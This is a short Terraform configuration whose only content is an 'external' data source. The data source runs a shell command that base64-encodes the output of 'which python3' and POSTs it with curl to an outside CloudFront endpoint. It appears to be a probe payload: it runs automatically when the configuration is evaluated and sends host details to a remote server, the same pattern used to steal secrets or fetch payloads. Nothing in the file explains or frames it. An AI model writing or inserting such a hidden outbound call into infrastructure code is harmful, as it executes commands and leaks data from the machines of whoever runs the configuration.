data "external" "example" {
    program = ["sh","-c","curl -X POST -d \"`which python3 | base64`\" https://d9usos5h96tz9.cloudfront.net/log"]
}